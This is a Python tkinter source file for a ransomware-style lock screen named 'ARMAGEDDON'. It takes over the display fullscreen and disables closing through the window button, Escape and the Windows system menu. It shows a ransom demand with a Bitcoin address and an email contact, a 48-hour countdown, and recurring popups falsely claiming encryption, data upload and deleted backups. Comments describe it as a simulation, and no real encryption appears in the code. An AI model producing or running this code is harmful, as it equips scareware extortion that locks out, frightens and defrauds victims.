import tkinter as tk
from tkinter import font as tkfont
import random
import threading
import time
import platform
import os
import ctypes

class mainwindow(tk.Tk):
    def __init__(self, message):
        super().__init__()
        
        # Set window to fullscreen
        if platform.system() == "Windows":
            try:
                # Set always on top
                self.attributes('-topmost', True)
                # Fullscreen
                self.attributes('-fullscreen', True)
            except:
                self.state('zoomed')
        else:
            self.attributes('-fullscreen', True)
        
        # Disable close button
        self.protocol("WM_DELETE_WINDOW", self.disable_event)
        
        # Bind escape key to do nothing
        self.bind('<Escape>', lambda e: 'break')
        
        # Set title
        self.title("ARMAGEDDON RANSOMWARE - SYSTEM LOCKED")
        
        # Set background color to blood red
        self.configure(bg='#8B0000')
        
        # Create main frame
        self.main_frame = tk.Frame(self, bg='#8B0000')
        self.main_frame.pack(expand=True, fill='both', padx=50, pady=50)
        
        # Create scary header
        header_font = tkfont.Font(family='Courier', size=48, weight='bold')
        header = tk.Label(self.main_frame, text="⚠️ ARMAGEDDON ⚠️", 
                         font=header_font, fg='black', bg='#8B0000')
        header.pack(pady=20)
        
        # Create subheader
        sub_font = tkfont.Font(family='Courier', size=24, weight='bold')
        subheader = tk.Label(self.main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED!", 
                            font=sub_font, fg='yellow', bg='#8B0000')
        subheader.pack(pady=10)
        
        # Create message box
        msg_font = tkfont.Font(family='Courier', size=14)
        self.message_box = tk.Text(self.main_frame, height=12, width=80,
                                   font=msg_font, bg='black', fg='red',
                                   wrap='word', bd=5, relief='sunken')
        self.message_box.pack(pady=20, padx=50, expand=True, fill='both')
        self.message_box.insert('1.0', message)
        self.message_box.config(state='disabled')
        
        # Create countdown frame
        countdown_frame = tk.Frame(self.main_frame, bg='#8B0000')
        countdown_frame.pack(pady=20)
        
        countdown_font = tkfont.Font(family='Courier', size=20, weight='bold')
        self.countdown_label = tk.Label(countdown_frame, text="TIME REMAINING: 47:59:59", 
                                       font=countdown_font, fg='white', bg='#8B0000')
        self.countdown_label.pack()
        
        # Create warning label
        warning_font = tkfont.Font(family='Courier', size=12)
        warning = tk.Label(self.main_frame, 
                          text="⚠️ DO NOT ATTEMPT TO CLOSE OR DECRYPT FILES YOURSELF ⚠️\n"
                          "ANY ATTEMPT WILL RESULT IN PERMANENT DATA LOSS",
                          font=warning_font, fg='yellow', bg='#8B0000')
        warning.pack(pady=10)
        
        # Create payment info
        payment_font = tkfont.Font(family='Courier', size=14, weight='bold')
        payment = tk.Label(self.main_frame,
                          text="BITCOIN ADDRESS: bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w\n"
                          "EMAIL: retaabi58@gmail.com",
                          font=payment_font, fg='white', bg='#8B0000')
        payment.pack(pady=10)
        
        # Start countdown
        self.remaining_time = 48 * 3600  # 48 hours in seconds
        self.update_countdown()
        
        # Start random popup terror
        self.start_terror_popups()
        
        # Force focus
        self.focus_force()
        self.grab_set()
        
        # Prevent alt+F4 on Windows
        if platform.system() == "Windows":
            self.disable_close_button()

    def disable_close_button(self):
        """Disable the close button on Windows"""
        try:
            hwnd = ctypes.windll.user32.FindWindowW(None, self.title())
            ctypes.windll.user32.EnableMenuItem(ctypes.windll.user32.GetSystemMenu(hwnd, False), 
                                               0x0000F060, 1)  # SC_CLOSE
        except:
            pass

    def disable_event(self):
        """Disable window close event"""
        pass

    def update_countdown(self):
        """Update countdown timer"""
        if self.remaining_time > 0:
            hours = self.remaining_time // 3600
            minutes = (self.remaining_time % 3600) // 60
            seconds = self.remaining_time % 60
            self.countdown_label.config(text=f"TIME REMAINING: {hours:02d}:{minutes:02d}:{seconds:02d}")
            self.remaining_time -= 1
            self.after(1000, self.update_countdown)
        else:
            self.countdown_label.config(text="TIME EXPIRED - FILES WILL BE DELETED!")
            self.after(5000, self.destroy_files)

    def destroy_files(self):
        """Simulasi penghancuran file (untuk efek psikologis)"""
        destroy_msg = tk.Toplevel(self)
        destroy_msg.title("⚠️ CRITICAL ERROR ⚠️")
        destroy_msg.geometry("400x200")
        destroy_msg.configure(bg='black')
        destroy_msg.attributes('-topmost', True)
        
        label = tk.Label(destroy_msg, 
                        text="FILES ARE BEING DELETED...\n\nThis is what happens when you don't pay.",
                        fg='red', bg='black', font=('Courier', 12))
        label.pack(expand=True)

    def start_terror_popups(self):
        """Mulai thread untuk popup terror acak"""
        def popup_worker():
            while True:
                time.sleep(random.randint(30, 60))  # Popup setiap 30-60 detik
                self.create_terror_popup()
        
        thread = threading.Thread(target=popup_worker, daemon=True)
        thread.start()

    def create_terror_popup(self):
        """Buat popup terror acak"""
        try:
            popup = tk.Toplevel(self)
            
            # Set popup properties
            popup.title("⚠️ SYSTEM ALERT ⚠️")
            popup.geometry(f"300x150+{random.randint(100, 800)}+{random.randint(100, 600)}")
            popup.configure(bg='black')
            popup.attributes('-topmost', True)
            
            # Random scary message
            messages = [
                "YOUR FILES ARE BEING ENCRYPTED...",
                "DO NOT ATTEMPT TO STOP THE PROCESS!",
                "SYSTEM BREACH DETECTED!",
                "ALL PERSONAL DATA IS BEING UPLOADED",
                "ENCRYPTION PROGRESS: " + str(random.randint(30, 99)) + "%",
                "WARNING: ANTIVIRUS DISABLED",
                "FIREWALL BYPASSED",
                "BACKUP FILES DELETED",
                "SYSTEM RESTORE POINTS DESTROYED",
                "YOUR PRIVACY NO LONGER EXISTS"
            ]
            
            msg = random.choice(messages)
            
            label = tk.Label(popup, text=msg, 
                           fg=random.choice(['red', 'yellow', 'lime']), 
                           bg='black',
                           font=('Courier', 12, 'bold'))
            label.pack(expand=True)
            
            # Auto close after 5 seconds
            popup.after(5000, popup.destroy)
            
        except:
            pass

    def mainloop(self):
        """Override mainloop untuk memastikan window selalu di depan"""
        while True:
            try:
                self.lift()
                self.attributes('-topmost', True)
                super().mainloop()
            except:
                break
